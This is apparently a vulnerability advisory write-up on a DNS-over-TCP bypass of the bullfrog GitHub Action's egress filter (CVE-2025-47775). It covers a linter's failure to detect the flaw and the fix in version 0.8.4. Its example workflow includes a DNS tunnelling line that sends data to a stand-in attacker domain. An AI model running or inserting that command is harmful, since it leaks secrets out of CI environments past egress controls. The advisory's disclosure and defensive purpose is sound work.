# GHSA-m32f-fjw2-37v3

## Summary
| Field | Value |
|-------|-------|
| CVE | CVE-2025-47775 |
| Affected Action | bullfrogsec/bullfrog |
| Severity | Moderate (CVSS 6.2) |
| Vulnerability Type | DNS over TCP Sandbox Bypass / Data Exfiltration (CWE-201) |
| Published | May 14, 2025 |

## Vulnerability Description

The `bullfrogsec/bullfrog` action's egress domain filtering can be bypassed when DNS queries use TCP protocol instead of the default UDP. As stated in the advisory: "Using tcp breaks blocking and allows DNS exfiltration."

**CVSS Vector:** CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- Attack Vector: Local (AV:L)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Confidentiality Impact: High (C:H)
- Integrity Impact: None (I:N)
- Availability Impact: None (A:N)

**Affected Versions:** All versions < 0.8.4

**Patched Version:** 0.8.4

**EPSS Score:** 0.103% (29th percentile) - Low probability of exploitation within 30 days

The issue arises when DNS queries use TCP protocol instead of the default UDP. While Bullfrog's filtering correctly blocks UDP-based DNS queries to unauthorized domains, TCP queries to the same blocked domains successfully bypass filtering.

**Proof of Concept:**
When configured with `egress-policy: block` allowing only `*.github.com`:
- UDP queries: `dig @8.8.8.8 api.google.com` → Correctly blocked
- TCP queries: `dig +tcp @8.8.8.8 api.google.com` → Bypasses filtering (vulnerable)

This represents a "sandbox bypass" vulnerability where attackers could:

1. Resolve blocked domain names using TCP DNS (`dig +tcp`)
2. Exfiltrate sensitive data via DNS tunneling over TCP
3. Bypass the configured egress policy
4. Access unauthorized external resources despite restrictive policies

The vulnerability exists because the network filtering implementation only monitors UDP port 53, allowing TCP-based DNS queries to pass through unchecked.

## Vulnerable Pattern

```yaml
- name: Setup Bullfrog with egress filtering
  uses: bullfrogsec/bullfrog@v1
  with:
    egress-policy: block
    allowed-endpoints: |
      api.github.com:443
      github.com:443

- name: Query DNS over TCP
  run: |
    # Bypasses egress-policy: block
    dig +tcp @8.8.8.8 malicious-domain.com

    # Data exfiltration via DNS tunneling
    echo "sensitive-data" | xxd -p | xargs -I {} dig +tcp @attacker-dns.com {}.exfil.attacker.com
```

The workflow configures egress blocking but TCP DNS queries bypass the restriction.

## sisakulint Detection Result

```
(No vulnerability-specific warnings detected)
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| No | N/A | No |

sisakulint detects general workflow security issues (permissions, timeout-minutes, commit-sha, etc.), but it does not detect this specific vulnerability (DNS over TCP egress policy bypass).

## Reason for Non-Detection

This vulnerability **cannot be detected by static analysis** for the following reasons:

1. **Runtime behavior**: The bypass depends on the network filtering implementation at runtime, not the workflow configuration
2. **Action internal implementation**: The issue is in how `bullfrog` implements egress filtering (missing TCP DNS filtering), not in how it's configured
3. **Valid configuration**: The workflow's `egress-policy: block` configuration is correct; the action's implementation is incomplete
4. **No suspicious pattern**: Using DNS commands like `dig` is common and legitimate in many workflows
5. **Protocol-specific**: The vulnerability requires understanding that TCP DNS is treated differently from UDP DNS at the network layer

**Detection category**: Action internal implementation + Runtime behavior

## Mitigation

The vulnerability was addressed in version 0.8.4 of `bullfrogsec/bullfrog` by filtering both UDP and TCP DNS traffic. Users should:

1. **Update to version 0.8.4 or later:**
   ```yaml
   - uses: bullfrogsec/bullfrog@v0.8.4
     with:
       egress-policy: block
       allowed-endpoints: |
         api.github.com:443
         github.com:443
   ```

2. **Verify that both UDP and TCP DNS queries are properly filtered**
3. **Consider using additional network monitoring tools**
4. **Audit workflows for potential DNS-based data exfiltration patterns**

**No workarounds are available** - users must upgrade to the patched version.

## Technical Fix Details

**Version 0.8.4 Changes:**

**Files Modified:**
- `action/dist/post.js` and `action/dist/post.js.map` - Compiled distribution files
- `action/src/post.ts` - Source TypeScript with updated function tracking
- `action/tetragon/connect.yml` - Tetragon policy configuration
- `agent/agent.go` - Main agent logic with DNS filtering

**Key Implementation Changes:**

1. **Tetragon Policy Update (`connect.yml`):**
   - Added `127.0.0.53` to filtered IPs for both `tcp_connect` and `udp_sendmsg` calls
   - Ensures both TCP and UDP DNS traffic is monitored

2. **Function Tracking (`post.ts`):**
   - Modified `functionsToTrack` array to `["tcp_connect", "udp_sendmsg"]`
   - Captures both TCP and UDP DNS traffic at the network layer

3. **Agent Refactoring (`agent.go`):**
   - Added `DNS_PORT = layers.TCPPort(53)` constant
   - Refactored DNS packet processing:
     - Created `processDNSPacket()` to validate DNS server before processing
     - Created `processDNSLayer()` to route between query/response processing
     - Split `processDNSQuery()` to focus on query-specific logic
   - **Critical Fix:** DNS server validation now occurs at the packet level before any DNS-specific logic executes, ensuring both TCP and UDP DNS queries are validated against allowed domains
   - Simplified `getDestinationIP()` using type switch for IPv4/IPv6
   - Added `*.githubapp.com` to default allowed domains

4. **Enhanced Logging:**
   - Added logging to show untrusted DNS server in blocked request annotations
   - Improved error message consistency

**Summary:**
The fix ensures DNS queries over TCP (port 53) are subject to the same domain filtering as UDP queries by validating the DNS server at the packet processing stage before any DNS-specific logic executes. This prevents attackers from bypassing egress policies using TCP-based DNS queries.

**Credits:**
Reported by [@vin01](https://github.com/vin01)
Published by [@fallard84](https://github.com/fallard84)

## References
- [GitHub Advisory: GHSA-m32f-fjw2-37v3](https://github.com/advisories/GHSA-m32f-fjw2-37v3)
- [bullfrogsec/bullfrog Security Advisory](https://github.com/bullfrogsec/bullfrog/security/advisories/GHSA-m32f-fjw2-37v3)
- [Fix Commit](https://github.com/bullfrogsec/bullfrog/commit/ae7744ae4b3a6f8ffc2e49f501e30bf1a43d4671)
- [Release v0.8.4](https://github.com/bullfrogsec/bullfrog/releases/tag/v0.8.4)
- [bullfrogsec/bullfrog Repository](https://github.com/bullfrogsec/bullfrog)
- [NVD: CVE-2025-47775](https://nvd.nist.gov/vuln/detail/CVE-2025-47775)
